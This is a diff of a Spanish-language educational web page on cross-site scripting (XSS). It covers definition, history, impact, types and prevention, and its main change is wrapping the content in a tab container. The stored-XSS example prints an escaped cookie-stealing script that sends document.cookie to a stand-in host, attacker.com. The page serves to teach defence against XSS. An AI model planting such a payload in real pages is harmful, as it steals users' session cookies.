@@ -117,58 +117,60 @@
                     </ul>
                 </div>
                 <div class="card-body">
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">¿Qué es XSS?</h4>
-                    <p class="card-title text-grey text-spacey">
-                        Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad en aplicaciones web que permite a los atacantes inyectar scripts maliciosos en las páginas vistas por otros usuarios. Esta técnica se utiliza para robar información sensible, como cookies de sesión, credenciales o incluso para redirigir a los usuarios a sitios maliciosos.
-                    </p>
+                    <!-- Contenido de la pestaña de Información -->
+                    <div id="info" class="tab-content">
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">¿Qué es XSS?</h4>
+                        <p class="card-title text-grey text-spacey">
+                            Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad en aplicaciones web que permite a los atacantes inyectar scripts maliciosos en las páginas vistas por otros usuarios. Esta técnica se utiliza para robar información sensible, como cookies de sesión, credenciales o incluso para redirigir a los usuarios a sitios maliciosos.
+                        </p>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Historia y Descubrimiento</h4>
-                    <p class="card-title text-grey text-spacey">
-                        XSS ha sido un problema conocido desde los primeros días de la web. Se hizo evidente a medida que las aplicaciones web comenzaron a permitir la interacción del usuario, especialmente en foros y aplicaciones de redes sociales. La vulnerabilidad fue documentada por primera vez a principios de la década de 2000 y ha sido incluida en el <strong>Top Ten de OWASP</strong> desde entonces.
-                    </p>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">Historia y Descubrimiento</h4>
+                        <p class="card-title text-grey text-spacey">
+                            XSS ha sido un problema conocido desde los primeros días de la web. Se hizo evidente a medida que las aplicaciones web comenzaron a permitir la interacción del usuario, especialmente en foros y aplicaciones de redes sociales. La vulnerabilidad fue documentada por primera vez a principios de la década de 2000 y ha sido incluida en el <strong>Top Ten de OWASP</strong> desde entonces.
+                        </p>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Impacto de XSS</h4>
-                    <p class="card-title text-grey text-spacey">
-                        Las vulnerabilidades XSS pueden tener graves consecuencias, incluyendo:
-                    </p>
-                    <p class="card-title text-grey text-spacey">1. Robo de información: Los atacantes pueden robar cookies, tokens de sesión y credenciales de usuario.</p>
-                    <p class="card-title text-grey text-spacey">2. Defacement: Modificación no autorizada del contenido de una página web.</p>
-                    <p class="card-title text-grey text-spacey">3. Redirección: Los usuarios pueden ser redirigidos a sitios web maliciosos.</p>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">Impacto de XSS</h4>
+                        <p class="card-title text-grey text-spacey">
+                            Las vulnerabilidades XSS pueden tener graves consecuencias, incluyendo:
+                        </p>
+                        <p class="card-title text-grey text-spacey">1. Robo de información: Los atacantes pueden robar cookies, tokens de sesión y credenciales de usuario.</p>
+                        <p class="card-title text-grey text-spacey">2. Defacement: Modificación no autorizada del contenido de una página web.</p>
+                        <p class="card-title text-grey text-spacey">3. Redirección: Los usuarios pueden ser redirigidos a sitios web maliciosos.</p>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Ejemplos de XSS</h4>
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">1. Ejemplo de XSS Reflejado:</h4>
-                    <p class="card-title text-grey text-spacey">Imagina un sitio web que muestra un mensaje de saludo en función de un parámetro en la URL:</p>
-                    <div class="card border-primary mb-3 text-center">
-                        <div class="card-body">
-                            <p class="mt-4 text-grey" style="font-weight: bold;">https://example.com/welcome?name=<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
-                            <p class="card-title text-grey text-spacey">El atacante puede inyectar un script que se ejecuta en el navegador del usuario, mostrando un mensaje de alerta.</p>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">Ejemplos de XSS</h4>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">1. Ejemplo de XSS Reflejado:</h4>
+                        <p class="card-title text-grey text-spacey">Imagina un sitio web que muestra un mensaje de saludo en función de un parámetro en la URL:</p>
+                        <div class="card border-primary mb-3 text-center">
+                            <div class="card-body">
+                                <p class="mt-4 text-grey" style="font-weight: bold;">https://example.com/welcome?name=<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                                <p class="card-title text-grey text-spacey">El atacante puede inyectar un script que se ejecuta en el navegador del usuario, mostrando un mensaje de alerta.</p>
+                            </div>
                         </div>
-                    </div>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">2. Ejemplo de XSS Almacenado:</h4>
-                    <p class="card-title text-grey text-spacey">Un atacante publica un comentario en un blog que contiene un script malicioso:</p>
-                    <div class="card border-primary mb-3 text-center">
-                        <div class="card-body">
-                            <p class="mt-4 text-grey" style="font-weight: bold;">&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</p>
-                            <p class="card-title text-grey text-spacey">Cuando otros usuarios ven el comentario, su cookie se envía al atacante.</p>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">2. Ejemplo de XSS Almacenado:</h4>
+                        <p class="card-title text-grey text-spacey">Un atacante publica un comentario en un blog que contiene un script malicioso:</p>
+                        <div class="card border-primary mb-3 text-center">
+                            <div class="card-body">
+                                <p class="mt-4 text-grey" style="font-weight: bold;">&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</p>
+                                <p class="card-title text-grey text-spacey">Cuando otros usuarios ven el comentario, su cookie se envía al atacante.</p>
+                            </div>
                         </div>
-                    </div>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Tipos de XSS</h4>
-                    <p class="card-title text-grey text-spacey">Los tipos principales de XSS son:</p>
-                    <ul class="card-title text-grey text-spacey">
-                        <li><strong>XSS Reflejado:</strong> El script malicioso es parte de la solicitud y se refleja en la respuesta del servidor.</li>
-                        <li><strong>XSS Almacenado:</strong> El script malicioso se almacena en el servidor (por ejemplo, en una base de datos) y se sirve a otros usuarios.</li>
-                        <li><strong>XSS DOM-Based:</strong> El ataque se realiza mediante manipulación del Document Object Model (DOM) del navegador.</li>
-                    </ul>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">Tipos de XSS</h4>
+                        <p class="card-title text-grey text-spacey">Los tipos principales de XSS son:</p>
+                        <ul class="card-title text-grey text-spacey">
+                            <li><strong>XSS Reflejado:</strong> El script malicioso es parte de la solicitud y se refleja en la respuesta del servidor.</li>
+                            <li><strong>XSS Almacenado:</strong> El script malicioso se almacena en el servidor (por ejemplo, en una base de datos) y se sirve a otros usuarios.</li>
+                            <li><strong>XSS DOM-Based:</strong> El ataque se realiza mediante manipulación del Document Object Model (DOM) del navegador.</li>
+                        </ul>
 
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Prevención de XSS</h4>
-                    <p class="card-title text-grey text-spacey">Las estrategias de prevención incluyen:</p>
-                    <ul class="card-title text-grey text-spacey">
-                        <li><strong>Validación de entrada:</strong> Asegurarse de que los datos de entrada sean válidos y no contengan scripts maliciosos.</li>
-                        <li><strong>Codificación de salida:</strong> Escapar caracteres especiales en el HTML (por ejemplo, <code>&lt;</code> a <code>&amp;lt;</code>).</li>
-                        <li><strong>Uso de CSP:</strong> Content Security Policy (CSP) puede ayudar a mitigar el impacto de XSS al restringir los orígenes de contenido.</li>
-                    </ul>
+                        <h4 class="mt-4 text-grey" style="font-weight: bold;">Prevención de XSS</h4>
+                        <p class="card-title text-grey text-spacey">Las estrategias de prevención incluyen:</p>
+                        <ul class="card-title text-grey text-spacey">
+                            <li><strong>Validación de entrada:</strong> Asegurarse de que los datos de entrada sean válidos y no contengan scripts maliciosos.</li>
+                            <li><strong>Codificación de salida:</strong> Escapar caracteres especiales en el HTML (por ejemplo, <code>&lt;</code> a <code>&amp;lt;</code>).</li>
+                            <li><strong>Uso de CSP:</strong> Content Security Policy (CSP) puede ayudar a mitigar el impacto de XSS al restringir los orígenes de contenido.</li>
+                        </ul>
                         <!-- Botón de volver para la pestaña de información -->
                         <div class="btn-container text-center">
                             <a href="../blog.html" class="btn btn-primary">Volver</a>
@@ -199,7 +201,7 @@
         // Prevent default anchor click behavior
         event.preventDefault();
 
-        // Hide all tabs
+        // Hide all tab contents
         const tabContents = document.querySelectorAll('.tab-content');
         tabContents.forEach(content => {
             content.style.display = 'none';
@@ -222,3 +224,4 @@
 
 </body>
 </html>
+
